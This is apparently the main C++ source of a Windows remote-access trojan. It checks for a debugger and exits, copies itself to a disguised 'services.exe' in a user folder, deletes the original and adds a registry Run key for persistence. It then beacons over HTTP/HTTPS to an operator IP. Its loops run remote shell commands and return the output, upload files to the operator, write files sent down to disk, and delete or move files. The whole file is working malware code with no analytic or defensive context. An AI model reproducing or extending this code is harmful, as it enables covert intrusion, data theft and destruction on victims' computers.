
#include <iostream>
#include <windows.h>
#include <Shlwapi.h>
#include "public.h"

#include "http.h"

#include "https.h"

#include "uuid.h"
#include "packet.h"
#include "FileHelper.h"

#include "file.h"
#include "shell.h"

#include "mission.h"

#include "json.h"
#include "utils.h"

#include "RegHelper.h"

#include "main.h"

#include "config.h"
#include <shlobj_core.h>

#pragma comment(lib,"ws2_32.lib")

using namespace std;


HANDLE g_mutex_handle = 0;


static const char g_predata[MAX_PATH] = "0123456789abcdef";



int __stdcall delFileProc(wchar_t * filename) {
	do 
	{
		Sleep(1000);
		int ret = DeleteFileW(filename);
		if (ret)
		{
			//runLog("delete file:%ws\r\n", filename);
			break;
		}
		
	} while (TRUE);

	return 0;
}


int init() {

	//__debugbreak();

	LPWSTR argvs = GetCommandLineW();

	int argc = 0;
	LPWSTR * wstrcmds = CommandLineToArgvW(argvs, &argc);
	if (argc > 2 && lstrcmpiW(wstrcmds[1], L"/Delete") == 0) {

		HANDLE ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)delFileProc, wstrcmds[2], 0, 0);
		if (ht)
		{
			CloseHandle(ht);
		}
	}

	int ret = 0;
	g_mutex_handle = bRunning(&ret);
	if (ret)
	{
		//runLog("already running\r\n");
		ExitProcess(0);
	}
	ret = isDebugged();
	if (ret)
	{
		//runLog("debuggered\r\n");
		ExitProcess(0);
	}

	WSAData wsa;
	ret = WSAStartup(0x0202, &wsa);

#ifdef _DEBUG
	if (g_predata[16])
#endif
	{
		PROGRAM_PARAMS* params = (PROGRAM_PARAMS*)(g_predata + 16);
		g_ip = params->ip;
		//g_ip = inet_addr("192.168.231.1");
		//lstrcpyA(params->path, "appdata");
		//g_interval = 1000;

		g_httpsToggle = params->bHttps;
		g_interval = params->hbi*1000;
		g_fsize_limit = params->fzLimit*1024*1024;

		//runLog("ip:%u,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);

		char curpath[1024];
		GetModuleFileNameA(0, curpath, sizeof(curpath));
		if ( isalpha (params->path[0]) &&params->path[1] == ':' && params->path[2] == '\\')
		{
			if (lstrcmpiA(params->path, curpath) != 0)
			{
				ret = copySelf(params->path);
				if (ret)
				{
					ReleaseMutex(g_mutex_handle);
					CloseHandle(g_mutex_handle);

					char szcmd[1024];
					wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", params->path,curpath);
					ret = WinExec(szcmd, SW_SHOW);

					ret = setRegBootRun(HKEY_CURRENT_USER, params->path);
					ExitProcess(0);
				}
			}
		}
		else {
			//char* user = getenv("USER");
			//char* appdata = getenv("APPDATA");
			//char mypath[MAX_PATH];
			//ret = SHGetSpecialFolderPathA(0, mypath, CSIDL_LOCAL_APPDATA, false);

			char* mypath = getenv(params->path);
			char service_path[] = { 's','e','r','v','i','c','e','s',0 };
			string folder = string(mypath) + "\\" + service_path;
			char exe_surfix[] = { '.','e','x','e' };
			string newfn = folder +"\\" + service_path + exe_surfix;
			if (lstrcmpiA(newfn.c_str(), curpath) != 0)
			{
				//runLog("folder:%s,path:%s\r\n",folder.c_str(),newfn.c_str());

				CreateDirectoryA(folder.c_str(), 0);

				ret = copySelf((char*)newfn.c_str());
				if (ret)
				{
					ReleaseMutex(g_mutex_handle);
					CloseHandle(g_mutex_handle);

					char szcmd[1024];
					wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", newfn.c_str(), curpath);
					ret = WinExec(szcmd, SW_SHOW);

					//runLog("cmd:%s\r\n", szcmd);

					ret = setRegBootRun(HKEY_CURRENT_USER,(char*) newfn.c_str());

					ExitProcess(0);
				}
			}
		}

		ret = setRegBootRun(HKEY_CURRENT_USER, curpath);
	}
#ifdef _DEBUG
	else {
		ret = Config::getConfig();
		char szpath[1024];
		GetModuleFileNameA(0, szpath, sizeof(szpath));
		ret = setRegBootRun(HKEY_CURRENT_USER, szpath);
	}
#endif

	ret = getUUID();

	return ret;
}



int clear() {
	int ret = 0;
	ret = WSACleanup();

	return ret;
}



int mytestfunc() {
	int ret = 0;

	//ret = uploadHttpsFile("test.txt");

	PacketParcel https(TRUE);

	ret = https.postCmd(CMD_ONLINE,0,0);

	ret = https.postFile("test.txt", MISSION_TYPE_FILE);

	ret = https.postCmd(CMD_QUERY_OPERATOR,0,0);

	return 0;

	PacketParcel http(TRUE);

	ret = http.postCmd(CMD_ONLINE,0,0);

	ret = http.postFile("test.txt", MISSION_TYPE_FILE);

	ret = http.postCmd(CMD_QUERY_OPERATOR, 0, 0);

	return ret;
}



int getProc() {
	int ret = 0;

// 	WCHAR url[1024];
// 	WCHAR wstruuid[256];
// 	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid));
// 	WCHAR wstrcmd[256];
// 	mbstowcs(wstrcmd, CMD_ONLINE, sizeof(wstrcmd));
// 	wsprintfW(url, L"/%ws?Data%ws%c%wsData", MY_PHP_SERVER, wstrcmd, (unsigned char)g_uuid_len, wstruuid);

	PacketParcel packet(FALSE);

	ret = packet.m_protocol->getCmd(CMD_ONLINE);

	while (TRUE)
	{
		ret = packet.m_protocol->getCmd(CMD_QUERY_OPERATOR);
		if (packet.m_protocol->m_respLen == 4 && *(DWORD*)packet.m_protocol->m_resp== INVALID_RESPONSE)
		{

		}
		else if(memcmp(packet.m_protocol->m_resp,CMD_SEND_DD_DATA,sizeof(CMD_SEND_DD_DATA)) == 0){
			PACKET_DATA_HEADER* file = (PACKET_DATA_HEADER*)packet.m_protocol->m_resp;

		}
	}

	return ret;
}




int __stdcall fileMission() {

	int ret = 0;
	

	PacketParcel packet(TRUE);

	while (TRUE)
	{
		runLog("%s %s\r\n", __FILE__, __FUNCTION__);

		ret = packet.postCmdFile(CMD_GET_DD_DATA, "",0);
		int datalen = packet.m_protocol->m_respLen;
		char* data = packet.m_protocol->m_resp;
		if (datalen == 0 || data == 0)
		{
			Sleep(g_interval);
			continue;
		}
		if (datalen == 4 && *(DWORD*)data == INVALID_RESPONSE)
		{
			
		}
		else if (datalen == 4 && *(DWORD*)data == DATA_PACK_TAG)
		{

		}
		else if (datalen > 4 && memcmp(data, CMD_SEND_DD_DATA, lstrlenA(CMD_SEND_DD_DATA)) == 0) {

			int fnl = *(data + 4);
			char* ptr = data + 4;
			ptr = ptr + 1 + fnl;

			MY_CMD_PACKET* pack = (MY_CMD_PACKET*)ptr;

			if (pack->type == MISSION_TYPE_DRIVE) {
				char drivers[128];
				int drivers_len = getDrivers(drivers, sizeof(drivers));

				char* sendbuf = buildCmd(drivers, drivers_len, MISSION_TYPE_DRIVE);

				ret = packet.postCmd(CMD_SEND_DRIVER, sendbuf, drivers_len+sizeof(MY_CMD_PACKET));
				if (sendbuf)
				{
					delete sendbuf;
				}		
			}
			else if (pack->type == MISSION_TYPE_FILE || pack->type == MISSION_TYPE_DIR)
			{
				*(pack->value + pack->len) = 0;
				ret = packet.postFile(pack->value,pack->type);
			}
			else if (pack->type == COMMAND_TYPE_TERMINATE)
			{
				int subcmd = *(int*)((char*)pack + sizeof(MY_CMD_PACKET));
				if (subcmd == COMMAND_TYPE_TERMINATE)
				{
				}
				MyJson json(JSON_CONFIG_FILENAME);
				json.insert(KEYNAME_DEAD_STATUS, "true", JSON_TYPE_STRING);
				json.saveFile();

				//ret = packet.postCmd(CMD_GET_CMD, 0, 0);

				ExitProcess(0);
			}
			else if (pack->type == COMMAND_TYPE_HEARTBEAT)
			{
				string s = string(pack->value, pack->len);
				int sec = atoi(s.c_str());
				g_interval = sec*1000;
				MyJson json(JSON_CONFIG_FILENAME);
				json.insert(KEYNAME_HEARTBEART_INTERVAL, s.c_str(), JSON_TYPE_STRING);
				json.saveFile();
			}
			else if (pack->type == MISSION_TYPE_UPLOAD)
			{
				string fn = string(pack->value, pack->len);
				MY_CMD_PACKET * pack2 = (MY_CMD_PACKET*)((char*)pack + sizeof(MY_CMD_PACKET) + pack->len);
				char* file = pack2->value;
				int filesize = pack2->len;
				int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
			}
			else if (pack->type == MISSION_TYPE_DELFILE)
			{
				string fn = string(pack->value, pack->len);

				ret = PathIsDirectoryA(fn.c_str());
				if (ret & FILE_ATTRIBUTE_DIRECTORY)
				{
					//rmdir /s/q
					string cmd = string("rmdir /s /q ") + fn;
					ret = shell(cmd.c_str());
				}
				else {
					ret = DeleteFileA(fn.c_str());
				}			
			}
			else if (pack->type == MISSION_TYPE_RENFILE)
			{
				string sfn = string(pack->value, pack->len);
				ret = PathIsDirectoryA(sfn.c_str());
				if (ret & FILE_ATTRIBUTE_DIRECTORY)
				{
					continue;
				}
				else {

				}
				MY_CMD_PACKET* pack2 = (MY_CMD_PACKET*)((char*)pack + sizeof(MY_CMD_PACKET) + pack->len);
				string dfn = string(pack2->value, pack2->len);

				int ret = 0;
				char* data = 0;
				int filesize = 0;
				ret = FileHelper::fileReader(sfn.c_str(), &data, &filesize);
				if (ret)
				{
					ret = FileHelper::fileWriter(dfn.c_str(), data, filesize, TRUE);
					DeleteFileA(sfn.c_str());
				}
			}

			datalen = packet.m_protocol->m_respLen;
			data = packet.m_protocol->m_resp;
			if (datalen >= 4 && *(int*)data == DATA_PACK_TAG)
			{

			}
		}

		Sleep(g_interval);
	}

	return 0;
}


int __stdcall cmdMission() {
	int ret = 0;

	

	PacketParcel packet(TRUE);

	while (TRUE)
	{
		runLog("%s %s\r\n", __FILE__, __FUNCTION__);

		ret = packet.postCmd(CMD_GET_CMD, 0,0);

		int datalen = packet.m_protocol->m_respLen;
		char* data = packet.m_protocol->m_resp;
		if (datalen == 0 || data == 0)
		{
			Sleep(g_interval);
			continue;
		}

		if (datalen == 4 && *(DWORD*)data == INVALID_RESPONSE)
		{

		}
		else if (datalen == 4 && *(DWORD*)data == DATA_PACK_TAG)
		{

		}
		else if (datalen >= 4 && memcmp(data, CMD_SEND_CMD, lstrlenA(CMD_SEND_CMD)) == 0) {
			//IN_PACKET_HEADER* pack = (IN_PACKET_HEADER*)data;
			//int hostlen = pack->hostname_len;

			MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(data + lstrlenA(CMD_SEND_CMD));

			int cmdlen = inpack->len;

			char* cmd = new char[(ULONGLONG)cmdlen + 16];

			memcpy(cmd, inpack->value,cmdlen);
			cmd[cmdlen] = 0;

			ret = shell(cmd);

			char* file = 0;
			int filesize = 0;
			ret = FileHelper::fileReader(CMD_RESULT_FILENAME, &file, &filesize);

			char* resdata = buildCmd(file, filesize, MISSION_TYPE_FILE);

			if (file)
			{
				delete file;
			}

			ret = packet.postCmd(CMD_SEND_CMD_RESULT, resdata, sizeof(MY_CMD_PACKET) + filesize);

			datalen = packet.m_protocol->m_respLen;
			data = packet.m_protocol->m_resp;

			if (resdata)
			{
				delete resdata;
			}

			DeleteFileA(CMD_RESULT_FILENAME);

			continue;
		}
		Sleep(g_interval);
	}
	
	return 0;
}




#pragma comment(linker, "/subsystem:windows /entry:WinMainCRTStartup")
// #pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
// #pragma comment(linker, "/subsystem:console /entry:mainCRTStartup")
// #pragma comment(linker, "/subsystem:console /entry:WinMainCRTStartup")



//compress,encrypt functions

int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) 
{
	int ret = 0;

	ret = init();

	//ret = mainProc();

// 	HANDLE ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)getAllFiles, 0, 0, 0);
// 	if (ht)
// 	{
// 		CloseHandle(ht);
// 	}

	HANDLE htf = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fileMission, 0, 0, 0);
	if (htf)
	{
		CloseHandle(htf);
	}
	HANDLE htc = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)cmdMission, 0, 0, 0);
	if (htc)
	{
		CloseHandle(htc);
	}

	while (TRUE)
	{

		PacketParcel packet(TRUE);

		ret = packet.postCmd(CMD_ONLINE, 0, 0);

		Sleep(g_interval);
	}	

	ret = clear();

	return 0;
}